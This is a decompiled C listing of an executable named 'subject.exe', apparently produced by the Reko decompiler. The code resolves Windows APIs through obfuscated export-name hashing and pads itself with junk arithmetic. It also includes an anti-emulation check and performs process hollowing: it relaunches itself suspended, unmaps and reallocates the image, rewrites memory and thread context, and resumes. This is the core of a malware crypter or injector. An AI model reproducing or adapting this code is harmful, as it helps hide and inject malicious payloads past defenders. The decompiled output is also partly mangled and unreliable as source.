// subject_UPX0.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: void fn00401000()
void fn00401000()
{
	Eq_2 tLoc30;
	ui32 dwLoc08;
	ui32 dwLoc0C;
	lstrcpyA(&tLoc30, g_t404058.u0);
	Eq_13 eax_26 = LoadLibraryA(&tLoc30);
	Eq_13 ebx_28 = eax_26;
	if (eax_26 == null)
	{
		lstrcatA(&tLoc30, g_t404018.u0);
		LoadLibraryA(&tLoc30);
		lstrcatA(&tLoc30, g_t404038.u0);
		ebx_28 = LoadLibraryA(&tLoc30);
	}
	g_ptr4041B0 = fn00401590(ebx_28, 3150609704);
	g_ptr4041B4 = fn00401590(ebx_28, 0x67444F49);
	g_ptr4041B8 = fn00401590(ebx_28, 1105085134);
	g_ptr4041BC = fn00401590(ebx_28, 1474698708);
	g_ptr4041C0 = fn00401590(ebx_28, 1474704852);
	g_ptr4041C4 = fn00401590(ebx_28, 2921547988);
	g_ptr4041C8 = fn00401590(ebx_28, 861160042);
	ui32 eax_72 = dwLoc08 + 2117 << (byte) dwLoc08 + 0x46 | dwLoc08 * 0x02;
	g_ptr4041CC = fn00401590(ebx_28, 1077640438);
	ui32 eax_155 = dwLoc0C * 0x02 | (-(((eax_72 << 0x03) << (byte) eax_72 * 0x02 + 0x11 ^ eax_72 * 0x02) * 0x04) + dwLoc0C * 0x02) + 0x49;
	g_ptr4041D0 = fn00401590(ebx_28, 0x1D0777C9);
	ui32 eax_252 = eax_155 * 0x02 + 8353 << ((byte) dwLoc0C << 0x01) * 0x02 + 0x13;
	g_ptr4041D4 = fn00401590(ebx_28, 2081088331);
	g_ptr4041D8 = fn00401590(ebx_28, 0x7C0EA5CB);
	g_ptr4041DC = fn00401590(ebx_28, 2112613963);
	ui32 eax_276 = eax_252 * 0x02 + 73 & 0x00 << 0x15 - (byte) eax_155;
	g_ptr4041E0 = fn00401590(ebx_28, 0x6D383070);
	ui32 eax_299 = eax_252 * 0x08 + 0x1C11 | eax_276 * 0x02 + 72;
	g_ptr4041E4 = fn00401590(ebx_28, 1578876749);
	ui32 eax_385 = -(eax_276 * 0x02) + eax_299 + 0x1B64 << (byte) eax_299 * 0x02;
	g_ptr4041E8 = fn00401590(ebx_28, 0x545BA730);
	ui32 eax_406 = eax_276 + 0x1999 | eax_385 + 0x1FAB;
	g_ptr4041EC = fn00401590(ebx_28, 3713246971);
	g_ptr4041F0 = fn00401590(ebx_28, 1519683438);
	ui32 eax_433 = eax_299 * 0x04 + 7353 | eax_299 + 0x1299 & eax_406 * 0x02 + 0xDA ^ eax_299 * 0x02;
	g_ptr4041F4 = fn00401590(ebx_28, 2811619130);
	ui32 eax_494 = eax_385 * 0x02 << ((byte) eax_385 * 0x08 + 0x6B | (byte) eax_433 * 0x02 + ~0x00 << (byte) eax_433 * 0x02 + 0x1C ^ (byte) eax_385 * 0x02) + 0x38 | eax_406 << 0x03 & eax_385 << 0x03;
	ui32 eax_522 = eax_494 * 0x02 ^ eax_494 * 0x02 + 0x94 ^ eax_406 * 0x02 - (eax_385 + 0x083B);
	struct Eq_260 * esp_548;
	g_ptr4041D8();
	esp_548->dwFFFFFFFC = g_dw404008;
	esp_548->ptrFFFFFFF8 = &tLoc30;
	ui32 ecx_557 = eax_494 * 0x02 + 8050;
	struct Eq_276 * esp_574;
	g_ptr4041D4();
	esp_574->dwFFFFFFFC = g_dw40402C;
	esp_574->ptrFFFFFFF8 = &tLoc30;
	ui32 ecx_587 = eax_494 * 0x02 + 42;
	struct Eq_292 * esp_600;
	g_ptr4041D4();
	esp_600->dwFFFFFFFC = g_dw40400C;
	esp_600->ptrFFFFFFF8 = &tLoc30;
	struct Eq_303 * esp_617;
	g_ptr4041D4();
	ui32 eax_589 = eax_494 << 0x03 << ((((byte) eax_385 + 0x78) *s (byte) ecx_557 + (byte) eax_494 * 0x08) + 0x90 ^ (byte) eax_522 * 0x02) + ~0x62 & ecx_587 | eax_494 * 0x02;
	esp_617->ptrFFFFFFFC = &tLoc30;
	ui32 edx_632 = eax_494 * 0x02 & eax_589 << 0x02;
	struct Eq_339 * esp_642;
	Eq_13 eax_643;
	g_ptr4041D0();
	esp_642->dwFFFFFFFC = 0xC1B23174;
	esp_642->tFFFFFFF8 = eax_643;
	g_ptr4041F8 = fn00401590(esp_642->tFFFFFFF8, esp_642->dwFFFFFFFC);
	esp_642->dwFFFFFFFC = 3718433336;
	esp_642->tFFFFFFF8 = eax_643;
	g_ptr4041FC = fn00401590(esp_642->tFFFFFFF8, esp_642->dwFFFFFFFC);
	esp_642->dwFFFFFFFC = 1166426269;
	esp_642->tFFFFFFF8 = eax_643;
	g_ptr404200 = fn00401590(esp_642->tFFFFFFF8, esp_642->dwFFFFFFFC);
	esp_642->dwFFFFFFFC = 3889878169;
	esp_642->tFFFFFFF8 = eax_643;
	g_ptr404204 = fn00401590(esp_642->tFFFFFFF8, esp_642->dwFFFFFFFC);
	esp_642->dwFFFFFFFC = 0xCC6A06F6;
	esp_642->tFFFFFFF8 = eax_643;
	g_ptr404208 = fn00401590(esp_642->tFFFFFFF8, esp_642->dwFFFFFFFC);
	ui32 eax_634 = eax_589 + 0x1BD0 & edx_632;
	ui32 eax_729 = eax_634 * 0x02 + 5950 | (eax_634 * 0x02 + 0x2257) *s (eax_634 * 0x04) >> (byte) eax_634 * 0x04;
	esp_642->dwFFFFFFFC = g_dw404030;
	ui32 eax_758 = 0x00 << (byte) eax_634 + 0x1C ^ eax_634 * 0x02 & eax_634 * 0x02 + 0xC2;
	ui32 edx_780 = eax_729 * 0x02 + 31;
	ui32 eax_781 = eax_758 * 0x08 + 3738 & edx_780;
	struct Eq_476 * esp_789;
	Eq_13 eax_790;
	g_ptr4041D0();
	esp_789->dwFFFFFFFC = 2196782966;
	esp_789->tFFFFFFF8 = eax_790;
	g_ptr40420C = fn00401590(esp_789->tFFFFFFF8, esp_789->dwFFFFFFFC);
	fn0040174D();
	ui32 eax_806 = eax_758 * 0x02 + 98 ^ (eax_781 * 0x02 >> (byte) eax_729 * 0x02 ^ eax_758 * 0x08 + 1575);
	ui32 ecx_842 = eax_806 * 0x04 + 0x11E9;
	esp_789->dwFFFFFFFC = 0x00;
	uint32 edx_844 = eax_806 * 0x02 >> (byte) ecx_842;
	g_ptr4041CC();
}

// 00401590: Register word32 fn00401590(Stack Eq_13 dwArg04, Stack uint32 dwArg08)
// Called from:
//      fn00401000
word32 fn00401590(Eq_13 dwArg04, uint32 dwArg08)
{
	ptr32 fp;
	struct Eq_559 * fs;
	ptr32 v6_15 = fs->ptr0000;
	fs->ptr0000 = fp - 20;
	word32 eax_61 = Mem58[Mem46[dwArg04 + 60:word32] + dwArg04 + 0x0078:word32] + dwArg04;
	word16 eax_65[] = dwArg04 + eax_61->dw0024 / 4;
	if (SetFileSecurityA(0x00, 0x00, null) != 0x00)
		dwArg08 += 0x000A0D40;
	if (SetFileSecurityA(666, 0x00, null) == 0x00)
		dwArg08 += 0x00075AAC;
	word32 eax_121[] = dwArg04 + eax_61->dw0020 / 4;
	word32 eax_126[] = dwArg04 + eax_61->dw001C / 4;
	int32 esi_128 = 0x00;
	while (true)
	{
		word32 eax_202;
		if (esi_128 >= eax_61->dw0018)
			break;
		uint32 eax_139 = 0x00;
		int32 ecx_146 = dwArg04 + eax_121[esi_128] / 4;
		byte dwLoc38_274[] = null;
		while (dwLoc38_274[ecx_146] != 0x00)
		{
			eax_139 = (eax_139 << 0x07 | eax_139 >> 0x19) ^ ((int32) dwLoc38_274[ecx_146] ^ 0x05);
			dwLoc38_274 = (byte (*)[]) (dwLoc38_274 + 1);
		}
		if (eax_139 == dwArg08)
		{
			eax_202 = dwArg04 + eax_126[(word32) eax_65[esi_128]] / 4;
			goto l0040173A;
		}
		++esi_128;
	}
	eax_202 = 0x00;
l0040173A:
	fs->ptr0000 = v6_15;
	return eax_202;
}

// 0040174D: void fn0040174D()
// Called from:
//      fn00401000
void fn0040174D()
{
	ptr32 fp;
	ui32 dwLoc10;
	ui32 dwLoc0C;
	ui32 dwLoc08;
	GetModuleFileNameA(null, &g_t404210, 0x0104);
	ui32 edx_35 = (dwLoc10 << 0x01) * 0x02 + 0x98;
	ui32 eax_38 = dwLoc0C + ~0x08D3 + (dwLoc08 - (dwLoc0C << 0x02)) << (byte) edx_35;
	struct Eq_696 * esp_46;
	g_ptr4041D8();
	esp_46->dwFFFFFFFC = g_dw40404C;
	esp_46->dwFFFFFFF8 = 0x00404314;
	int32 ecx_55 = dwLoc08 * 0x04 + 6799;
	ui32 edx_61 = dwLoc0C * 0x02 + 0x05;
	ui32 eax_62 = -((dwLoc0C * 0x04 + 0x23C0) *s ecx_55) + dwLoc0C * 0x02 + 0x0F1D | edx_61;
	struct Eq_729 * esp_72;
	g_ptr4041D4();
	esp_72->dwFFFFFFFC = g_dw404024;
	esp_72->dwFFFFFFF8 = 0x00404314;
	ui32 edx_82 = eax_38 * 0x08 + 0x1BB4 & eax_62 * 0x04 + 5434;
	int32 eax_87 = (eax_62 * 0x02 + 0x87) *s (dwLoc0C + 0x1BFD) & edx_82;
	struct Eq_759 * esp_97;
	g_ptr4041D4();
	esp_97->dwFFFFFFFC = g_dw404020;
	esp_97->dwFFFFFFF8 = 0x00404314;
	struct Eq_770 * esp_114;
	g_ptr4041D4();
	esp_114->dwFFFFFFFC = 0x00404210;
	esp_114->dwFFFFFFF8 = 0x00404314;
	int32 eax_127 = ((eax_87 + 0x093D) * 0x08 + 0x116B) *s (eax_38 * 0x02 + 69) + eax_87 * 0x08;
	ui32 edx_121 = eax_87 * 0x02 + 242;
	struct Eq_800 * esp_138;
	g_ptr4041D4();
	g_dw404418 = 0x44;
	g_dw404444 = 0x01;
	ui32 edx_152 = eax_87 * 0x02 & ((((eax_87 + 0x093D) * 0x02 + 188) *s eax_87) * 0x02 & eax_87 + 1668);
	g_w404448 = 0x02;
	ui32 eax_158 = eax_87 + 0x0FEC & edx_152 * 0x04 + 0x13E3;
	esp_138->dwFFFFFFFC = 0x0040445C;
	esp_138->dwFFFFFFF8 = 0x00404418;
	esp_138->dwFFFFFFF4 = 0x00;
	esp_138->dwFFFFFFF0 = 0x00;
	esp_138->dwFFFFFFEC = 0x04;
	esp_138->dwFFFFFFE8 = 0x00;
	esp_138->dwFFFFFFE4 = 0x00;
	esp_138->dwFFFFFFE0 = 0x00;
	esp_138->dwFFFFFFDC = 0x00404314;
	esp_138->dwFFFFFFD8 = 0x00;
	ui32 eax_172 = (eax_158 + 5561) *s (eax_158 * 0x02 + 0xD1) >> (byte) eax_158 * 0x02 + ~0x29 | eax_87 * 0x02;
	ui32 edx_183 = eax_87 * 0x02 + 0xAC;
	ui32 eax_184 = eax_172 + 7587 + eax_172 * 0x02 >> (byte) eax_172 + ~0x31 & edx_183;
	struct Eq_907 * esp_209;
	g_ptr4041B0();
	esp_209->tFFFFFFFC.u0 = 0x00;
	ui32 eax_225 = edx_152 << 0x03 | edx_152 * 0x04 + 1880 | eax_184 + 3355 >> (byte) eax_172 * 0x02;
	Eq_13 eax_229 = GetModuleHandleA(esp_209->tFFFFFFFC);
	word32 eax_250 = eax_229 + Mem248[eax_229 + 60:word32];
	esp_209->tFFFFFFFC.u0 = 0x40;
	esp_209->dwFFFFFFF8 = 0x3000;
	esp_209->dwFFFFFFF4 = (int32) eax_250[20];
	esp_209->tFFFFFFF0 = eax_229;
	esp_209->dwFFFFFFEC = g_dw40445C;
	int32 eax_256 = (eax_225 << 0x03) *s (eax_172 + 0x0A85);
	struct Eq_969 * esp_271;
	word32 eax_272;
	g_ptr4041B4();
	int32 eax_236 = (eax_225 * 0x02 + 0x0055) *s (eax_172 * 0x02 + 0x0C);
	esp_271->ptrFFFFFFFC = fp - 20;
	esp_271->dwFFFFFFF8 = (int32) eax_250[20];
	esp_271->tFFFFFFF4 = eax_229;
	esp_271->dwFFFFFFF0 = eax_272;
	esp_271->dwFFFFFFEC = g_dw40445C;
	struct Eq_1003 * esp_318;
	g_ptr4041B8();
	ui32 eax_288 = eax_256 * 0x02 + 0xA5 & ~0x24 - ((eax_236 * 0x02 + 0x86) *s (eax_225 * 0x02) | (eax_236 + 0x0F70) *s (eax_225 * 0x04 + 0x1F60)) * 0x02 >> ((byte) eax_256 << 0x03);
	g_dw40446C = 0x00010007;
	esp_318->dwFFFFFFFC = 0x0040446C;
	esp_318->dwFFFFFFF8 = g_dw404460;
	ui32 eax_299 = eax_288 - eax_172 * 0x02 + 0x2362 | (eax_288 << 0x02) << (byte) eax_172 * 0x02;
	ui32 edx_338 = (eax_256 << 0x02) + 0x0404;
	ui32 ecx_335 = eax_172 * 0x02 + 3388 ^ (eax_256 * 0x02 + 3384) + (eax_256 << 0x02) >> (byte) eax_299 * 0x08 + 0x26;
	ui32 eax_339 = eax_256 * 0x02 & edx_338;
	struct Eq_1085 * esp_349;
	g_ptr4041BC();
	g_dw404524 = 4202082;
	esp_349->dwFFFFFFFC = 0x0040446C;
	esp_349->dwFFFFFFF8 = g_dw404460;
	ui32 eax_375 = eax_299 * 0x02 - ecx_335;
	struct Eq_1102 * esp_384;
	g_ptr4041C0();
	esp_384->dwFFFFFFFC = g_dw404460;
	ui32 ecx_393 = ecx_335 * 0x04 + 0x090D;
	ui32 edx_399 = (eax_375 + 0x0CBD) * 0x02 + 0x0069;
	g_ptr4041C4();
}

CHAR g_str40300C[] = "ker"; // 0040300C
CHAR g_str4030C3[] = "l32.dll"; // 004030C3
CHAR g_str4030EF[] = "ne"; // 004030EF
word32 g_dw404008 = 0x004030FB; // 00404008
word32 g_dw40400C = 0x004030F7; // 0040400C
Eq_8 g_t404018 = // 00404018
	{
		&g_str4030EF
	};
word32 g_dw404020 = 0x004030E8; // 00404020
word32 g_dw404024 = 0x004030E3; // 00404024
word32 g_dw40402C = 0x004030DA; // 0040402C
uint32 g_dw404030 = 0x004030CE; // 00404030
Eq_8 g_t404038 = // 00404038
	{
		&g_str4030C3
	};
word32 g_dw40404C = 0x00403016; // 0040404C
Eq_8 g_t404058 = // 00404058
	{
		&g_str40300C
	};
<anonymous> * g_ptr4041B0 = null; // 004041B0
<anonymous> * g_ptr4041B4 = null; // 004041B4
<anonymous> * g_ptr4041B8 = null; // 004041B8
<anonymous> * g_ptr4041BC = null; // 004041BC
<anonymous> * g_ptr4041C0 = null; // 004041C0
<anonymous> * g_ptr4041C4 = null; // 004041C4
<anonymous> * g_ptr4041C8 = null; // 004041C8
<anonymous> * g_ptr4041CC = null; // 004041CC
<anonymous> * g_ptr4041D0 = null; // 004041D0
<anonymous> * g_ptr4041D4 = null; // 004041D4
<anonymous> * g_ptr4041D8 = null; // 004041D8
<anonymous> * g_ptr4041DC = null; // 004041DC
<anonymous> * g_ptr4041E0 = null; // 004041E0
<anonymous> * g_ptr4041E4 = null; // 004041E4
<anonymous> * g_ptr4041E8 = null; // 004041E8
<anonymous> * g_ptr4041EC = null; // 004041EC
<anonymous> * g_ptr4041F0 = null; // 004041F0
<anonymous> * g_ptr4041F4 = null; // 004041F4
<anonymous> * g_ptr4041F8 = null; // 004041F8
<anonymous> * g_ptr4041FC = null; // 004041FC
<anonymous> * g_ptr404200 = null; // 00404200
<anonymous> * g_ptr404204 = null; // 00404204
<anonymous> * g_ptr404208 = null; // 00404208
<anonymous> * g_ptr40420C = null; // 0040420C
CHAR g_t404210 = '\0'; // 00404210
word32 g_dw404418 = 0x00; // 00404418
word32 g_dw404444 = 0x00; // 00404444
word16 g_w404448 = 0x00; // 00404448
word32 g_dw40445C = 0x00; // 0040445C
word32 g_dw404460 = 0x00; // 00404460
word32 g_dw40446C = 0x00; // 0040446C
word32 g_dw404524 = 0x00; // 00404524
